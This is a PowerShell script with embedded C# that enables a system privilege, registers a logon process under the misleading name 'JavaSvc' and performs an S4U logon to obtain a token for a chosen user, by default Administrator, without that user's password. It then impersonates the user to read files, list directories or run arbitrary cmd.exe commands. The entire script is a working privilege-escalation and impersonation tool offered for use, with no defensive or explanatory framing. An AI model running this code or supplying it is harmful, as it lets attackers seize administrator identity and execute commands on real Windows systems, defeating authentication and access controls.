param(
    [Parameter(Mandatory=$true)]
    [ValidateSet('read','dir','exec')]
    [string]$Action,

    [Parameter(Mandatory=$true)]
    [string]$Target,

    [string]$User = 'Administrator',
    [string]$Domain = 'SRV01'
)

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

public class S4UI2 {
    [DllImport("ntdll.dll")] static extern uint RtlAdjustPrivilege(int P, bool E, bool T, out bool W);
    [DllImport("secur32.dll", CharSet=CharSet.Ansi)] static extern uint LsaRegisterLogonProcess(ref LSA_STRING n, out IntPtr h, out ulong s);
    [DllImport("secur32.dll", CharSet=CharSet.Ansi)] static extern uint LsaLookupAuthenticationPackage(IntPtr h, ref LSA_STRING n, out uint p);
    [DllImport("secur32.dll")] static extern uint LsaLogonUser(IntPtr h, ref LSA_STRING o, uint t, uint p, IntPtr buf, uint len, IntPtr g, ref TOKEN_SOURCE s, out IntPtr pp, out uint pl, out LUID li, out IntPtr tok, out QUOTA qs, out uint sub);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool ImpersonateLoggedOnUser(IntPtr tok);
    [DllImport("advapi32.dll", SetLastError=true)] static extern bool RevertToSelf();
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)]
    struct LSA_STRING { public ushort Len, MaxLen; public string Buffer; }
    [StructLayout(LayoutKind.Sequential)] struct LUID { public uint L; public int H; }
    [StructLayout(LayoutKind.Sequential)] struct TOKEN_SOURCE { [MarshalAs(UnmanagedType.ByValArray, SizeConst=8)] public byte[] N; public long I; }
    [StructLayout(LayoutKind.Sequential)] struct QUOTA { public IntPtr a,b,c,d,e,f; }
    static LSA_STRING MkStr(string s) { return new LSA_STRING { Buffer=s, Len=(ushort)s.Length, MaxLen=(ushort)(s.Length+1) }; }

    static IntPtr GetTok(string u, string d) {
        bool was; RtlAdjustPrivilege(7,true,false,out was);
        LSA_STRING n=MkStr("JavaSvc"); IntPtr lh; ulong sm;
        LsaRegisterLogonProcess(ref n,out lh,out sm);
        LSA_STRING pn=MkStr("MICROSOFT_AUTHENTICATION_PACKAGE_V1_0");
        uint pkg; LsaLookupAuthenticationPackage(lh,ref pn,out pkg);
        byte[] uB=Encoding.Unicode.GetBytes(u),dB=Encoding.Unicode.GetBytes(d);
        int sz=40,uO=sz,dO=sz+uB.Length,tot=dO+dB.Length;
        IntPtr buf=Marshal.AllocHGlobal(tot);
        for(int i=0;i<tot;i++) Marshal.WriteByte(buf,i,0);
        Marshal.WriteInt32(buf,0,12);
        Marshal.WriteInt16(buf,8,(short)uB.Length); Marshal.WriteInt16(buf,10,(short)uB.Length);
        Marshal.WriteInt64(buf,16,buf.ToInt64()+uO);
        Marshal.WriteInt16(buf,24,(short)dB.Length); Marshal.WriteInt16(buf,26,(short)dB.Length);
        Marshal.WriteInt64(buf,32,buf.ToInt64()+dO);
        for(int i=0;i<uB.Length;i++) Marshal.WriteByte(buf,uO+i,uB[i]);
        for(int i=0;i<dB.Length;i++) Marshal.WriteByte(buf,dO+i,dB[i]);
        TOKEN_SOURCE src=new TOKEN_SOURCE{N=Encoding.ASCII.GetBytes("JavaS4U "),I=0x1337};
        LSA_STRING org=MkStr("S4U");
        IntPtr pp,tok; uint pl,sub; LUID li; QUOTA q;
        LsaLogonUser(lh,ref org,3,pkg,buf,(uint)tot,IntPtr.Zero,ref src,out pp,out pl,out li,out tok,out q,out sub);
        Marshal.FreeHGlobal(buf); return tok;
    }

    public static string ReadFile(string u, string d, string path) {
        IntPtr tok=GetTok(u,d);
        if(tok==IntPtr.Zero) return "NoToken";
        bool ok=ImpersonateLoggedOnUser(tok); CloseHandle(tok);
        if(!ok) return "ImpErr:"+Marshal.GetLastWin32Error();
        try { return File.ReadAllText(path); }
        catch(Exception e) { return "ERR:"+e.Message; }
        finally { RevertToSelf(); }
    }

    public static string ListDir(string u, string d, string path) {
        IntPtr tok=GetTok(u,d);
        if(tok==IntPtr.Zero) return "NoToken";
        bool ok=ImpersonateLoggedOnUser(tok); CloseHandle(tok);
        if(!ok) return "ImpErr:"+Marshal.GetLastWin32Error();
        try { return string.Join("\n", Directory.GetFileSystemEntries(path)); }
        catch(Exception e) { return "ERR:"+e.Message; }
        finally { RevertToSelf(); }
    }

    public static string RunCmd(string u, string d, string cmd) {
        IntPtr tok=GetTok(u,d);
        if(tok==IntPtr.Zero) return "NoToken";
        bool ok=ImpersonateLoggedOnUser(tok); CloseHandle(tok);
        if(!ok) return "ImpErr:"+Marshal.GetLastWin32Error();
        try {
            var p=new System.Diagnostics.Process();
            p.StartInfo.FileName="cmd.exe";
            p.StartInfo.Arguments="/c "+cmd;
            p.StartInfo.UseShellExecute=false;
            p.StartInfo.RedirectStandardOutput=true;
            p.StartInfo.RedirectStandardError=true;
            p.Start();
            string o=p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd();
            p.WaitForExit();
            return o;
        }
        catch(Exception e) { return "ERR:"+e.Message; }
        finally { RevertToSelf(); }
    }
}
'@

switch ($Action) {
    'read' { [S4UI2]::ReadFile($User, $Domain, $Target) }
    'dir'  { [S4UI2]::ListDir($User, $Domain, $Target) }
    'exec' { [S4UI2]::RunCmd($User, $Domain, $Target) }
}
